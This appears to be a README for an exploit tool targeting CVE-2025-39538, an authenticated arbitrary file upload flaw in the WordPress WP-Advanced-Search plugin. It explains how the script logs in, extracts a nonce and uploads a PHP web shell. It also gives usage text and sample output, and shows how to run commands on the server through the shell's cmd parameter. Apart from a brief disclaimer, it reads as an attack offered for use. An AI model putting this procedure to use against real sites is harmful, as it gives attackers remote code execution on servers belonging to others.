
# 🛡️ CVE-2025-39538 - WordPress WP-Advanced-Search <= 3.3.9.3 Arbitrary File Upload

**CVE-2025-39538**  
**Published:** 2025-04-16  
**Vulnerability Type:** Arbitrary File Upload (Unrestricted Upload of File with Dangerous Type)  
**Affected Plugin:** WP-Advanced-Search by Mathieu Chartier  
**Affected Versions:** All versions up to and including 3.3.9.3

This vulnerability allows an authenticated attacker to upload a malicious PHP file (such as a web shell) to the server using the import functionality provided by the plugin. The uploaded file is placed under the WordPress uploads directory and could lead to remote code execution.

🧱 Upload path:
```
wp-content/uploads/2025/04/
```

---

## ⚙️ About the Exploit Script

This Python script performs the following actions:
1. Logs into the WordPress site using provided credentials.
2. Extracts the required `wp_advanced_search_up_nonce` from the import/export admin page.
3. Uploads a web shell (PHP file) via a crafted POST request.

---

## 🚀 Usage

```bash
usage: a.py [-h] -u URL -un USERNAME -p PASSWORD

CVE-2025-39538 - WP Advanced Search Arbitrary File Upload Exploit # By Nxploited (Khaled Alenazi)

options:
  -h, --help            show this help message and exit
  -u, --url URL         Target WordPress URL (e.g., http://127.0.0.1/wordpress)
  -un, --username USERNAME
                        WordPress Username
  -p, --password PASSWORD
                        WordPress Password

```

### 🖥️ Example Output:
```
[*] Attempting login...
[+] Logged in successfully.
[*] Fetching nonce from import/export page...
[+] Nonce extracted: 2140855687
[*] Attempting to upload shell...
[+] File uploaded (check wp-content/uploads or temp directory).
```

---
## 🐚 Using the Uploaded Shell

After the upload, you can access your shell like this:

```
http://target.site/wp-content/uploads/2025/04/nxploit.php?cmd=whoami
```

Replace `whoami` with any Linux command you want to execute, for example:
- `id` — shows current user ID.
- `pwd` — shows current directory.
- `ls` — lists files.
## ⚠️ Disclaimer
---
This tool is intended for **educational and authorized security testing** purposes only.  
The author is **not responsible** for any misuse or damage caused by this script.

---

_**By: Nxploited | Khaled Alenazi**_
